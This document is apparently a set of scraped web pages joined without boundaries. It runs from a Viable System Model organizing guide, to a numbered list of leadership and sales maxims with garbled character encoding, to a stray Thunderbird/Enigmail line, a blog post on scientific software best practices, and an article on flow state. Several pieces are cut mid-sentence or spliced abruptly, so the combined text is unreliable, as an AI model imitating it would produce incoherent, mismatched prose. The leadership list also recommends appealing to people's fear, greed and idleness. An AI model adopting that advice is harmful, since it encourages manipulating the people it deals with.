    general assembly and deciding what to do.</li></ul><figure><label for="4795629d-bd54-48ac-9327-a5506bea1564">⇣</label><span>Ants use a feedback loop to collectively forage in an uncertain
    environment. The system (the foraging party) depends on checking and
    adapting to the environment. Where they find food they lay trails to
    attract more foraging.</span><img src="https://vsru.org/static/img/viable-organizing/ant_feedback_loop.png" alt="A drawing of ants searching for food in a feedback loop"></figure><p>When all six systems work together, they keep internal conflict
    constructive. System 5 can’t know everything, and neither can any other
    system. They all adjust to disagreement by coordinating their different
    points of view.</p><p>The six systems will also let the organization adapt to its environment and
    thrive as best it can.</p></section><section><h2>Getting Started</h2><p>Viable systems can be very big, small, or somewhere in between. So when
    diagnosing your organization, you have to decide what scope you want to work
    at. Is it your garden, the whole community, the city, the country? Viable
    systems are recursive: Each one contains many others, like the way the
    pieces of a Russian Matryoshka doll fit together.</p><figure><label for="6871386a-ed0e-4ec1-97d6-dac202238ba3">⇣</label><span>Patterns can repeat across different scales within the same organism.
    The branching structure that appears in the veins of a laurel leaf
    reemerges along the plant’s stems and boughs.</span><img src="https://vsru.org/static/img/viable-organizing/recursion_branching.png" alt="A drawing of workers leaves and branches"></figure><p>Every System 1 is its own VSM with all six parts of the model. If a whole
    system is really viable, then its members should be too, right? We can trust
    System 1s to “do their own thing” because they use all six systems. It lets
    them conduct daily activities and adapt to change as needed. Every time we
    go “down a level,” we pick a System 1 and look at how it contains all six
    systems in itself. There is always more organization to find as you zoom in
    or out. It’s like a spiral or a fractal picture.</p><p>The important thing is to pick a level to diagnose, and stick with it until
    you understand how it works. If your system is the kitchen, analyse the
    whole kitchen (not just one of its parts). You can get valuable insights so
    long as you do. After that, you can change your scope and diagnose again.</p><p>You could begin diagnosing your kitchen by noting what’s going on—food prep,
    cooking, serving, dishwashing, cleaning, meal planning, worker assignment;
    each of these is its own system. When you understand how the kitchen works,
    you could then diagnose dishwashing as its own system. How are dishes
    cleaned? How are they transported to the dishwashing station? And so on.</p></section><section><h2>The Importance of Autonomy</h2><p>It’s easy to look at the VSM and assume that control comes from the top
    down. In fact, sometimes it has to because cohesion becomes more important
    than autonomy. But the VSM doesn’t promote top-down dictatorships, because
    it sees why they are bad organizations.</p><p>When COVID broke out, the top health experts in the world needed to tell
    everyone to stay at home and use masks. Most of us followed those
    instructions because they made sense. But if a health expert came into our
    homes and told us when exactly to go to sleep, we’d tell them to take a
    hike. We understand the little details of our lives better than any expert
    could. We are the best judges of how to live our own lives, unless we’re
    being a danger to our society.</p><p>Almost everything is best decided autonomously because “the people on the
    ground” know what’s happening there. A well-designed system should maximize
    local autonomy. For example, the road rules tell everyone which side to
    drive on. As long as everyone stays on their side, System 2 is working well,
    and no one is bothered by on-coming traffic. No one tells every single
    driver what to do, they follow the rules autonomously and it all works out.</p><p>It’s the exceptions to the rule that need more coordination. The gardeners
    know best how to garden. But if they’re growing food no one wants to eat,
    it’s of no use to the organization. Then what to do with the wasted food?
    Maybe the garden can sell it to the grocery down the way? Is it okay for us
    to sell food? These kinds of questions can’t be answered by just gardening.
    The higher level systems need to keep the organization viable. This doesn’t
    mean having experts decide all the big questions. But it does mean everyone
    needs to be clear about what roles they’re playing, and when they switch.</p></section><section><h2>Interventions</h2><p>Sometimes System 3* needs to audit a System 1 when a System 1 breaks an
    “intervention rule.” Intervention rules are agreed by system 1 and 3 and set
    a breaking point that triggers the audit. Audits break the System 1’s
    autonomy, so should be taken very seriously.</p><h3>Set intervention metrics</h3><p>First of all, the System 1 should set metrics for itself. It doesn’t need to
    tell System 3 what they are. But it must decide what kinds of things it
    wants to do, and how much of each thing it should do. This could be
    something like, “How much water the garden needs, and when it needs
    watering?” Every time the garden doesn’t get watered, the metric gets worse;
    every time it does, it gets better. Once System 1 decides on the metrics, it
    needs to regularly pass along the numbers to System 3. Again, these metrics
    don’t need to be labeled. All that System 3 needs to know is if they’re
    going up or down.</p><h3>Agree on the breaking point</h3><p>System 1 and System 3 should agree on a breaking point where System 3* will
    intervene. For example: “If metric 1 is at less than 80% for 5 days, System
    3 will send an auditor to see what’s going on and report back.”</p><h3>Agree on a check-in (if needed)</h3><p>System 1 knows best what metrics to set and how to meet them, but sometimes
    a check-in is required. Once System 3 sees what’s going on, they might come
    up with a solution or pass it along to System 4 to figure out. The
    higher-level systems then work out a plan with System 1, and autonomy is
    restored.</p></section><section><h2>Major Pain Points</h2><p>Out of the six systems, System 2 and System 4 are the most likely to be
    neglected or fail. This is because it’s not always obvious that they need doing.
    These pain points are also the areas most likely to come under attack from both
    outside and inside forces, so it’s important to nurture and strengthen them.</p><figure><label for="73e87143-1eb5-4f89-8f14-f09cbd548dd3">⇣</label><span>Trees extend the bulk of their roots horizontally. These interconnect to
    create a chemical communication network that can span entire …</span></figure></section></article></div>

</center><p>1. This handbook is different. It starts with the question, â€˜How can you learn to lead?â€™ In our research with over 1,000 leaders at all levels in public, private and voluntary sectors the answer was clear: leaders learn not from courses but from experience, bosses, peers and role models.</p><p>2. Finally, it is worth learning one lesson from the worldâ€™s top athletes. Each gold medallist is supreme in one discipline: they focus relentlessly on becoming the best at one thing. They do not focus on their weaknesses. No one asks weightlifters to improve their synchronized swimming skills. Leaders, like athletes, cannot succeed at everything. They have to focus on their strengths, practise relentlessly and find the context or discipline in which they can flourish.</p><p>3. <b>Our research found no effective leaders who were cynical about their work, their organization, themselves or their lives. They were relentlessly positive about everything.</b></p><p>4. <b>If you want a high-performing team, do not be afraid to set high expectations.</b></p><p>5. To build trust with your followers, you have to be honest with them. This is hard-form honesty: telling the whole truth promptly, even when it is painful.</p><p>6. <b>Authority and popularity are weak currencies for leadership. Authority can be removed in a reorganization. Popularity leads to weakness: you avoid the difficult conversations; you avoid stretching the team too far; you accept excuses. Honesty and trust are the true currencies for leadership. No one can take them away from you. Honesty and trust build respect, which lasts longer than popularity.</b></p><p>7. An ineffective team will all be clones of the leader. An effective team will complement the leaderâ€™s technical strengths and personal style. Your job is not to be the best person on the team. As a leader, your job is to get all the best people onto the team.</p><p>8. Athletes, like leaders, do not win by playing to their weaknesses and imagining failure. They win by building on their strengths and rehearsing, visualizing success in their minds. From this comes four principles :</p><blockquote>
<p>i. Play to your strengths</p>
<p>ii. Visualise Success</p>
<p>iii. Think like a winner</p>
<p>iv. Create a team that compensates for your weaknesses</p>
</blockquote><p>9. Coach yourself by following the plan-do-review cycle on all your activities:<br></p><blockquote>
<p>i. Plan - what you want to achieve and how.Â&nbsp;</p>
<p>ii. Do it.</p>
<p>iii. Review it - Review stage is where you learn most and it is your chance to accelerate your career. It is your secret weapon.</p>
</blockquote><p>10. After any key event, ask yourself two questions:<br></p><blockquote>
<p>Â&nbsp;i. WWW. What went well? Success is not the natural state of things. When things work well, step back and ask why? This is how you will build your personal success formula.</p>
<p>Â&nbsp;ii. EBI: Even better if. Ask what you could have done differently, or tried to make things work better.</p>
</blockquote><p>11. Warren Buffet remarked that â€˜when a great manager joins a lousy company, it is normally the reputation of the company that remains intactâ€™.</p><p>12. Strong teams are diverse. Diversity means more than diversity of race, gender, age and faith.Â&nbsp; It means the subtler diversity of building a team with complementary styles, skills and perspectives. A football team of 11 great goalkeepers is unlikely to do well.</p><p>13. <b>Failure to delegate traps you into doing low-level jobs. You cannot lead if you cannot delegate. </b>Here is why you must delegate :<br></p><blockquote>
<p>i. Delegation is the only way to create more than 24 hours in a day. If you don't delegate, you work yourself into an early grave.</p>
<p>ii.Delegation allows you to focus on the areas where you make the most difference.</p>
<p>iii. It shows you have trust in the team, and most teams will respond to your vote of confidence in them by working hard to show they are worthy of your trust.</p>
<p>iv. It builds and stretches your team: they have to learn new skills.</p>
</blockquote><p>14. Principles of delegation :Â&nbsp;<br></p><blockquote>
<p>-Ensure clarity of the task and the eventual success criteria.</p>
<p>-Make the team summarise back to you what they think the task and outcomes are meant to be. Do not assume they have understood anything until they say it back to you.</p>
<p>-Ensure people have enough skills and resources to complete the job : do not delegate too much too soon.</p>
<p>-Be clear about how you want to work together (progress reports). Discuss concerns before you start.</p>
<p>-Be available to help, but do not interfere all the time. When they ask for help, require them to suggest solutions so that they always learn.</p>
<p>-Delegate meaningful projects, not just adminstriva. Stretch people and they will rise to the challenge. Giving away mundane jobs only demotivates people.</p>
<p>-Show faith and trust in the team : praise successes and do not undermine them</p>
<p>-Remember, you may have delegated authority, but you cannot delegate away responsibility. You are still accountable for the outcomes.</p>
</blockquote><p>15. Always try to figure out how to appeal to fear, greed and idleness.</p><p>16. Five drivers of motivation in the workplace:<br></p><blockquote>
<p>i. My boss shows an interest in my career.</p>
<p>ii. I trust my boss; he/she is honest with me.</p>
<p>iii. I know where we are going and how to get there.</p>
<p>iv. I am doing a worthwhile job.</p>
<p>v. I am recognized for my contribution</p>
</blockquote><p>17. The best way to communicate is to shut up. If necessary, put duct tape over your mouth and force yourself to listen. The more you listen, the more you understand. When you really understand what the other person is thinking, then you can influence them positively.</p><p>18. Good leaders normally have a simple agenda, which boils down to three things: idea, people, money, or the IPM agenda:</p><blockquote>
<p>i. Idea. You need to have a simple idea about what you will do that will be different from and better than the past. The best ideas are simplest: â€˜We will increase customer satisfactionâ€™, â€˜We will increase reliabilityâ€™, â€˜We will reduce costsâ€™.</p>
<p>ii. People. If you have the B team, you have a recipe for sleepless nights and stress. Do not assume that the team you inherited is the team you must live with.</p>
<p>iii. Money. Make sure you have the right budget to fulfil your goals.</p>
</blockquote><p>19. SPIN â€“ situation and specifics, personal impact, insight and inquiry, and next steps â€“ is a classic and simple framework for giving negative feedback:<br></p><blockquote>
<p>i. Situation and specifics. Give feedback in the right situation: when the person is calm and the event is still fresh in the mind.</p>
<p>ii. Personal impact. Do not judge the other person: that invites conflict. Say how his or her actions made you feel: feelings are irrefutable. For example, say: â€˜You have turned up late to three client meetings; it makes me feel you think they are unimportantâ€™, not: â€˜You are a lazy idlerâ€™, â€˜I was very embarrassed when the CFO saw the errors in the budget you preparedâ€™, or â€˜You are an innumerate scumbag.â€™</p>
<p>iii. Insight and inquiry. Ask questions to see if the person understands the problem, to help him or her explore and evaluate options and discover the way forward.</p>
<p>iv. Next steps. Mutually agree what happens next. There needs to be a positive way forward. You need to have thought through possible options and actions.</p>
</blockquote><p>20. The Art of War advocated fighting under only three conditions, all of which must be present: 1) only fight when there is a prize worth fighting for; 2) only fight when you know you will win; and 3) only fight when there is no alternative.</p><p>21. The trust equation shows that trust (T) is a function of values alignment (V) and credibility (C) offset by risk (R): high risk means you need higher levels of trust to work together.<br></p><p>22. You have no permanent friends or allies; there are only permanent interests. At some point, your interests and their interests will go different ways simply because you are in different roles and have different priorities.</p><div><p>23. The more senior you become, the harder you have to push for the next step. Early in your career, if you work hard and do well you will be promoted because every firm wants to encourage the next generation of leadership talent. But as your career progresses, there are fewer opportunities and there is more competition. Leadership is not given to you; you have to take it.</p><p>24. Everyone is selling: ideas, proposals and social events. We normally sell at three levels: features (â€˜ My computer has 8GB RAM memoryâ€™); benefits (â€˜ It can handle video editingâ€™); dreams (â€˜ It could turn me into a Hollywood mogulâ€™).</p></div><p>25. Avoid selling features. At least work out the benefits, or ideally the dreams, that will appeal to the person you are selling to. Start with what the person wants, not with what you have.</p><p>26. We have already met fear, greed, idleness and risk in motivation skills. We meet them again in selling skills. They work together:Â&nbsp;</p><blockquote>
<p>-Fear: What problem am I solving for the other person? </p>
<p>-Greed: What hope or dream am I helping the other person achieve? </p>
<p>-Idleness and risk: Am I making it easy for the other person to agree? Have I removed the risks he or she perceives?</p>
</blockquote><div><p>27. The selling proposition varies dramatically depending on who you are selling to. You succeed when you focus less on the product and more on the buyerâ€™s needs.</p><p>28. It is not enough to know what to sell. You also need to know how to sell. Here is a classic seven-step sales cycle:Â&nbsp;</p></div><blockquote>
<p>-Agree the problem/ opportunity. </p>
<p>-Preview the benefits of addressing the problem/ opportunity. </p>
<p>-Suggest the idea. </p>
<p>-Explain how it works. </p>
<p>-Pre-empt objections. </p>
<p>-Reinforce the benefits. </p>
<p>-Close.</p>
</blockquote><p>29. <b>Many leaders come to the realization that they hire for skills and fire for (the wrong) values. Do not make that mistake. Hire to values, not just to skills.</b></p><p>30. The new currency of leadership is respect. Respect is based on two vital ingredients: trust and positive challenge. Trust is dealt with extensively elsewhere in the book. As a reminder, you build trust through values alignment (you â€˜talk the talkâ€™ of the other person) and credibility (you always deliver on commitments, or you â€˜walk the talkâ€™). Trust is good, but not enough for respect. As a leader you will gain …</p></div></div></div>

You'll have to hold back upgrading Thunderbird. There will be no
fully-functional version of Enigmail for Thunderbird 78.

July 16, 2020 | https://grst.github.io/bioinformatics/2020/07/16/hallmarks-scientific-software.html | <a href="https://web.archive.org/web/*/https://grst.github.io/bioinformatics/2020/07/16/hallmarks-scientific-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>Science is facing a <a href="https://en.wikipedia.org/wiki/Replication_crisis">reproducibility
crisis</a>. Poorly designed or
 implemented scientific software represent a major limitation in making
packages reusable and analyses reproducible. In this article, I’ll break down
good software engineering practices to six <em>hallmarks</em>. These hallmarks guide
researchers through improving their code quality, maximizing the utility and
impact of the software, and in the long run improve the perspective of
replication in science.</p>

<p>Adhering to these guidelines is one aspect of making your research <a href="https://www.go-fair.org/fair-principles/">FAIR</a> (<strong>f</strong>indable, <strong>a</strong>ccessible, <strong>i</strong>nteroperable and <strong>r</strong>eusable).</p>

<p><img src="https://grst.github.io/assets/bioinformatics/hallmarks_annotated.png" alt="hallmarks"></p>

<p><strong>Figure 1</strong>: The Hallmarks of Good Scientific Software<sup id="fnref:hallmarks"><a href="#fn:hallmarks">1</a></sup>. The icons
 (except pipeline) are from <a href="https://fontawesome.io/">fontawesome</a>. The figure
 may be reused under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
 license.</p>

<p>These hallmarks focus on tools and habits which will help taking your software quality
to the next level. I assume that you are already familiar with the basics of 
<em>clean coding principles</em>, i.e. you format your code consistently, use sensible 
variable names, and <a href="https://en.wikipedia.org/wiki/KISS_principle">keep everything stupidly simple</a>. 
The importance of writing easy-to-read code cannot be overstated. 
A good starting point for learning how to write clean code is this <a href="http://stat405.had.co.nz/r-style.html">style guide for R</a>
and the <a href="https://github.com/zedr/clean-code-python#introduction">clean-code-python</a> project.</p>

<p>Next, let’s distinguish between <em>software packages</em> and <em>data analysis reports</em>.
Both are pieces of software which are covered by the hallmarks – however, they
have slightly different priorities.  Software packages are a tool, or a
collection of tools which are created with the aim of being applied to different
datasets. A typical example would be a sequence aligner like
<a href="https://github.com/alexdobin/STAR">STAR</a>, or a library for single-cell RNA-seq
analysis like <a href="https://scanpy.readthedocs.io/">scanpy</a> or
<a href="https://satijalab.org/seurat/">Seurat</a>. The main goal of software packages is
<strong>reusability</strong>, defined by the ability to reuse the code for multiple datasets
and for diverse goals of data analysis.</p>

<p>In contrast, <em>data analysis reports</em> mostly build upon existing software
packages and are specifically adapted to produce interpretable results for a
certain dataset. The main goal of data analysis reports is <strong>reproducibility</strong>,
defined by the ability to reproduce the results when run in another computing
environment or in a later time point than when the report was written.  Yet, it
can often make sense to abstract a data analysis report into a reusable pipeline
which can be applied to other datasets.</p>

<p>The first four hallmarks apply to both software packages and data analysis
reports. (In fact, they apply to pretty much any kind of software):</p>

<ol>
  <li>Use version control (<a href="https://git-scm.com/">git</a>)</li>
  <li>Use automated testing and continuous integration (e.g. <a href="https://github.com/features/actions">GitHub actions</a>)</li>
  <li>Containerize all dependencies (e.g. <a href="https://www.docker.com/">Docker</a>, <a href="https://sylabs.io/docs/">Singularity</a>)</li>
  <li>Write extensive, high-quality documentation (e.g. <a href="https://www.sphinx-doc.org/en/master/">sphinx</a>, <a href="https://pkgdown.r-lib.org/">pkgdown</a>)</li>
</ol>

<p>In addition to that, two more hallmarks apply to data analysis reports:</p>

<ol>
  <li>Use automated reporting (e.g. <a href="https://rmarkdown.rstudio.com/">Rmarkdown</a>, <a href="https://jupyter.org/">Jupyter notebooks</a>)</li>
  <li>Use a workflow manager (e.g. <a href="https://www.nextflow.io/">nextflow</a>, <a href="https://snakemake.readthedocs.io/en/stable/">Snakemake</a>)</li>
</ol>

<h2 id="use-version-control">Use version control</h2>
<p><img src="https://grst.github.io/assets/bioinformatics/brick_vc.png" alt="vc"></p>

<p>The first, and arguably the most important hallmark is to use
<a href="https://git-scm.com/">git</a><sup id="fnref:vc-systems"><a href="#fn:vc-systems">2</a></sup>. It keeps track of all your code
changes, and allows you to share your code on public repositories such as
<a href="https://github.com/">GitHub</a><sup id="fnref:github"><a href="#fn:github">3</a></sup>. <strong>Making the code publicly available and
easy to be modified by others is the first step towards making your project both
discoverable and reproducible.</strong></p>

<p>There are many benefits of using git and GitHub, for instance:</p>

<ul>
  <li>You don’t need to worry about backups any more. Every version of your code you store in git can be restored at any time.</li>
  <li>It allows you to keep track of what you did (this is very useful when continuing on a project after several weeks of interruption).</li>
  <li>It allows you to synchronize changes across working environments (say laptop and server cluster) and between collaborators.</li>
  <li>GitHub provides an issue tracker and project management tools to keep track of bugs and suggestions.</li>
</ul>

<p>Yet, the most important aspect of using GitHub is to get people involved with your software. <br>
<strong>Communication is an essential part of the scientific process, and GitHub is the way to communicate about scientific 
software.</strong> It increases your visibility in the community and makes your software 
being discovered more easily. You can retrieve feedback in form of bug reports, feature
requests and code reviews. Others can directly contribute improvements in the form of
<a href="https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/about-pull-requests">pull requests</a>. 
Finally, it enables you to browse other, well-engineered pieces of software and learn
from them by reading their code.</p>

<p><strong>Tool of choice:</strong> <a href="http://git-scm.com/">git</a> in combination with <a href="https://github.com/">GitHub</a> or <a href="https://gitlab.com/">GitLab</a>.</p>

<h2 id="use-automated-testing-and-continuous-integration">Use automated testing and continuous integration</h2>
<p><img src="https://grst.github.io/assets/bioinformatics/brick_testing.png" alt="testing"></p>

<p>Automated testing is an industry standard in software firms for <em>years</em>, but it
is terribly underused in most scientific software, particularly those developed
by single contributors such as students and contractors. Automated testing does
not only ensure that your software package works on other systems than yours or
that you don’t break old functionality while adding new one – <strong>it also
increases the likelihood that the results your software generates are actually
predictable, at least within the space of the input parameters that you can
test, and correct</strong>. The correctness of the software output is top priority for
scientific software.</p>

<p>The concept of automated testing is simple: for every piece of code you write,
you also write a <em>unit test</em> that calls the piece of code with some example
data, and validates that it produces the expected result.</p>

<p>Initially, this might seem like a waste of time, but it isn’t: it helps to to
<strong>find bugs early</strong>. As a result, it pays off and saves time in the long run.
Finding bugs early decreases the cost for fixing them. If you detect a bug
right after writing the function, you still have everything in your memory
and can likely fix it within minutes. If the bug is discovered by someone
else a few months later, it might take you hours or days to figure out the
problem, because you have to dig into the code again. There are excellent
packages for automated testing for virtually every programming language. The
most common ones are <a href="https://docs.pytest.org/en/latest/">pytest</a> for Python
and <a href="https://testthat.r-lib.org/">testthat</a> for R. Moreover,
<a href="https://hypothesis.readthedocs.io/en/latest/">Hypothesis</a> is a python
package implementing <a href="https://medium.com/criteo-labs/introduction-to-property-based-testing-f5236229d237">property-based
testing</a>,
which holds the promise to facilitate writing tests while covering a larger
set of test cases.</p>

<p>Writing tests by itself is not helpful if they are not executed on a regular
basis. This is where <em>continuous integration</em> comes into place. Continuous
integration runs your tests every time you upload your code on e.g. GitHub and
notifies you if the tests fail. By combining continuous integration with a
<a href="https://guides.github.com/introduction/flow/">branch-and-pull-request
workflow</a>, you ensure that the
code on your master branch is always fully tested. You are notified when tests
fail, therefore increasing the chance to fix bugs early and quickly.</p>

<p><strong>Tools of choice</strong>: <a href="https://docs.pytest.org/en/latest/">pytest</a> and
<a href="https://hypothesis.readthedocs.io/en/latest/">Hypothesis</a> 
for Python packages, <a href="https://testthat.r-lib.org/">testthat</a> for R
packages. <a href="https://docs.github.com/en/actions">GitHub Actions</a> for continuous integration.</p>

<h2 id="containerize-dependencies">Containerize dependencies</h2>
<p><img src="https://grst.github.io/assets/bioinformatics/brick_container.png" alt="container"></p>

<blockquote>
  <p>If I have seen further it is by standing on the shoulders of Giants.</p>
</blockquote>

<p><i>(Isaac Newton, 1675)</i></p>

<p>This is definitely true for scientific software. Most software packages and data
analyses would not be possible without giants like
<a href="https://dplyr.tidyverse.org/">dplyr</a>,
<a href="https://ggplot2.tidyverse.org/">ggplot2</a>, <a href="https://numpy.org/">numpy</a>,
<a href="https://www.scipy.org/">scipy</a> and many more domain-specific packages.
Unfortunately, complex dependencies make it hard to install and run your
software. They also hamper reproducibility of your analysis as different
versions might be incompatible or produce slightly different results. This
phenomenon is commonly referred to as the <em><a href="https://en.wikipedia.org/wiki/Dependency_hell">dependency
hell</a>.</em></p>

<p>Therefore, it is vital to accurately declare all dependencies required for your
software to run, <strong>down to the exact version number</strong>.  The most reliable way of
doing so is to build a <em>container</em> with all software required to run your
software. That way, your package or analysis can be ran in exactly the same
software environment you have been using. Containers are one of the few ways to ensure
that your analysis can be ran in a few years from now<sup id="fnref:conda-reprod"><a href="#fn:conda-reprod">4</a></sup>.</p>

<p>For software packages (as opposed to data analysis reports) it is also
appropriate to declare the dependencies in the format of the corresponding
package manager. This could be a <a href="http://r-pkgs.had.co.nz/description.html">DESCRIPTION
file</a> for R, a <a href="https://python-packaging.readthedocs.io/en/latest/dependencies.html">setup.py
file</a> for
python, or a <a href="https://docs.conda.io/projects/conda-build/en/latest/resources/define-metadata.html#source-section">conda
recipe</a>.
Arguably, the best option is to offer both: properly declared dependencies and a
container.</p>

<p><strong>Tools of choice</strong>: <a href="https://sylabs.io/docs/">Singularity</a> and
<a href="https://www.docker.com/">Docker</a> for data analyses.
<a href="https://bioconda.github.io/">Bioconda</a> or
<a href="https://conda-forge.org/">conda-forge</a> for software packages.</p>

<h2 id="write-extensive-high-quality-documentation">Write extensive, high-quality documentation</h2>
<p><img src="https://grst.github.io/assets/bioinformatics/brick_docs.png" alt="docs"></p>

<p>Documentation is an essential part of each software. <strong>Without proper
documentation, the most elegant piece of software can be useless.</strong> As a rule of
thumb, the documentation should have at least as many lines as the source code.
Documentation helps users getting started with your software quickly and vastly
increases the potential userbase.</p>

<p>For software packages, good documentation consists, one the one hand, of a
documentation of the public interface (API). The API consists of all functions,
classes etc. which are exposed to the end user. The API documentation describes
the input parameters and results for each function.  On the other hand, the
documentation should comprise instructions on how to install the package and a
step-by-step tutorial teaching the user to apply the software to real-world
datasets.</p>

<p>For data analysis reports, it is best to mix the documentation with the code

<p>It is common practice to run a few commands in an R shell to produce a plot and
then copy and paste it to a PowerPoint presentation. <strong>This is not only terrible
from a reproducibility perspective, it is also inefficient and error-prone.</strong> It
is inefficient, because you have to re-do the plot manually if you change your
preprocessing or get new data. It is error-prone, because you’ll forget to
update all plots and old (wrong) versions keep floating around.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Imagine you are hiking down one of your favorite slopes. Conditions are perfect. You are entirely focused. You know precisely how to move at each moment. <em>There is no future, no past. There is only the present.</em> <em>You are completely immersed in the experience, not thinking about or distracted by anything else.</em> Your ego dissolves, and you become part of what you are doing.</p><p>This is the kind of experience Bruce Lee described with his famous “Be water, my friend.”</p><p>The opposite can also happen. As the quip attributed, Einstein goes, “Put your hand on a hot stove for a minute, and it seems like an hour. Sit with a pretty girl fo, an hour, and it seems like a minute. That is relativity.”</p><p>The funny thing is that someone else might enjoy the same task, but we want to finish as quickly as possible.</p><h2 id="power-of-flow-state-of-mind">Power of Flow State of Mind</h2><p>These questions are also at the heart of psychologist <a href="https://en.wikipedia.org/wiki/Mihaly_Csikszentmihalyi">Mihaly Csikszentmihalyi’s</a> research into the experience of being completely immersed in what we are doing. Csikszentmihalyi called this state “flow,” and described it as the pleasure, delight, creativity, and process of being completely immersed in life.</p><p>To achieve this optimal experience, we have to focus on increasing the time we spend on activities that bring us to this state of flow, rather than allowing ourselves to get caught up in activities that offer immediate pleasure—like eating too much, abusing drugs or alcohol, or stuffing ourselves with chocolate in front of the TV.</p><p>As Csikszentmihalyi asserts in his book Flow: <a href="https://www.amazon.com/Flow-Psychology-Experience-Perennial-Classics/dp/0061339202">The Psychology of Optimal Experience</a>, “Flow is the state in which people are so involved in an activity that nothing else seems to matter; the experience itself is so enjoyable that people will do it even at great cost, for the sheer sake of doing it.”</p><p>It is not only creative professionals who require high doses of concentration that promote flow. Most athletes, chess players, and engineers spend much of their time on activities that bring them to this state.</p><p>According to Csikszentmihalyi’s research, a chess player feels the same way upon entering a state of flow as a mathematician working on a formula or a surgeon operating. Csikszentmihalyi analyzed data from people around the world and discovered that flow is the same among individuals of all ages and cultures.</p><h2 id="how-to-achieve-flow-state-of-mind">How to Achieve Flow State of Mind</h2><p>If you often find yourself losing focus while working on something you consider essential, there are several strategies you can employ to increase your chances of achieving flow.</p><p>The Seven Conditions for Achieving Flow</p><p>According to researcher <a href="https://www.cdm.depaul.edu/Faculty-and-Staff/Pages/faculty-info.aspx?fid=1416">Owen Schaffer</a> of <a href="https://www.depaul.edu/">DePaul University</a>, the requirements for achieving flow are :</p><ol><li><p>Knowing what to do</p></li><li><p>Knowing how to do it</p></li><li><p>Knowing how well you are doing</p></li><li><p>Knowing where to go (where navigation is involved)</p></li><li><p>Perceiving significant challenges</p></li><li><p>Perceiving significant skills</p></li><li><p>Being free from distractions.</p></li></ol><h2 id="strategy-1-choose-optimal-task">Strategy 1: Choose optimal task</h2><p>Schaffer’s model encourages us to take on tasks we have a chance of completing, but that are slightly outside our comfort zone.</p><p>Every task, sport, or job has a set of rules, and we need a set of skills to follow them. If the rules for completing a task or</p><p>achieving a purpose are too basic relative to our skillset, we will likely get bored.</p><p>If, on the other hand, we assign ourselves a task that is too difficult, we won’t have the skills to complete it and will almost certainly give up—and feel frustrated, to boot.</p><p>The ideal is to find a middle path, something aligned with our abilities but just a bit of a stretch, so we experience it as a challenge. This is what Ernest Hemingway meant when he said, “Sometimes I write better than I can.”</p><p>We want to see challenges through to the end because we enjoy the feeling of pushing ourselves. Bertrand Russell expressed a similar idea when he said, “To be able to concentrate for a considerable amount of time is essential to difficult achievement.”</p><p>Add a little something extra, something that takes you out of your comfort zone.</p><p>Even doing something as simple as reading means following specific rules, having certain abilities and knowledge. If we set out to read a book on quantum mechanics, for specialists in physics without being specialists in Physics ourselves, we’ll probably give up after a few minutes. On the other end of the spectrum, if we already know everything a book has to tell us, we’ll get bored right away.</p><p>However, if the book is appropriate to our knowledge and abilities, and builds on what we already know, we’ll immerse ourselves in our reading, and time will flow.</p><h2 id="strategy-2-have-a-clear-concrete-objective">Strategy 2: Have a clear, concrete objective</h2><p>Video games—played in moderation—board games, and sports are great ways to achieve flow because the objective tends to be very clear: Beat your rival while following a set of explicitly defined rules.</p><p>Unfortunately, the objective isn’t quite as clear in most situations.</p><p>In business, the creative professions, and education alike, it’s important to reflect on what we hope to achieve before Starting to work, study, or make something. We should ask ourselves questions such as:</p><ul><li><p>What is my objective for today’s session in the studio?</p></li><li><p>How many words am I going to write today for the article coming. out next month?</p></li><li><p>What is my team’s mission?</p></li><li><p>How fast will I set the metronome tomorrow in order to play that sonata at an allegro tempo by the end of the week?</p></li></ul><p>*Having a clear objective is important in achieving flow, but we also have to know how to leave it behind when we get down to business. *Once the journey has begun, we should keep this objective in mind without obsessing over it.</p><p>As soon as you take these first small steps, your anxiety will disappear and you will achieve a pleasant flow in the activity you’re doing. Getting back to Albert Einstein,” a happy man is too satisfied with the present to dwell on the future.”</p><table><thead><tr><th>Vague Objective</th><th>Clearly Defined Objective and a Focus on Process</th><th>Obsessive Desire to Achieve a Goal While Ignoring Process</th></tr></thead><tbody><tr><td>Confusion;time and energy wasted on meaningless tasks</td><td>Flow</td><td>Fixation on the objective rather than getting down to business</td></tr><tr><td>Mental block</td><td>Flow</td><td>Mental block</td></tr></tbody></table><h2 id="strategy-3-concentrate-on-a-single-task">Strategy 3: Concentrate on a single task</h2><p>This is perhaps one of the most significant obstacles we face today, with so much technology and many distractions. We’re listening to a video on YouTube while writing an e-mail, when suddenly a chat prompt and we answer it. Then our smartphone vibrates in our pocket; just as we respond to that message, we’re back at, logging on to Facebook.</p><p>Pretty soon thirty minutes have passed, and we’ve forgotten what the e-mail we were writing was supposed to be</p><p>about.</p><p>Sometimes, this happens when we put on a movie with dinner and don’t realize how delicious the salmon was until we re-taken the last bite.</p><p>We often think that combining tasks will save us time, but scientific evidence shows that it has the opposite effect. Even those who claim to be good at multitasking are not very productive. In fact, they are some of the least productive people.</p><p>Our brains can take in millions of bits of information but can only actually process a few dozen per second. When we say we’re multitasking, what we’re really doing is <em>switching back and forth</em> between tasks very quickly. Unfortunately, we’re not computers adept at parallel processing. We end up spending all our energy alternating between tasks, instead of focusing on doing one of them well.</p><p><img src="https://karenapp.io/articles/images/flow-state-of-mind/2.jpg" alt="karenapp"></p><p><em>Concentrating on one thing at a time may be the single most important factor in achieving flow.</em></p><p>According to Csikszentmihalyi, in order to focus on a task we need:</p><ol><li><p>To be in a distraction-free environment</p></li><li><p>To have control over what we are doing at every moment</p></li></ol><p>Technology is great, if we’re in control of it. It’s not so great if it takes control of us. For example, if you have to write a research paper you might sit down at your computer and use Google to look up the information you need. However, if you’re not very disciplined, you might end up surfing the Web instead of writing that paper. In that case, Google and the Internet will have taken over, pulling you out of your state of flow.</p><p>It has been scientifically shown that if we continually ask our brains to switch back and forth between tasks, we waste time, make more mistakes, and remember less of what we’ve done.</p><p>Several studies conducted at Stanford University by Clifford Ivar Nass describe our generation as suffering from an <em>epidemic of multitasking</em>. One such study analyzed hundreds of students’ behavior, dividing them into groups based on the number of things they tended to do at once. The students who were the most addicted to multitasking typically alternated among more than four tasks; for example, taking notes while reading a textbook, listening to 2 podcasts, answering messages on their smartphone, and sometimes checking their Twitter timeline.</p><p>Each group of students was shown a screen with several red and several blue arrows. The objective of the exercise was to count the red 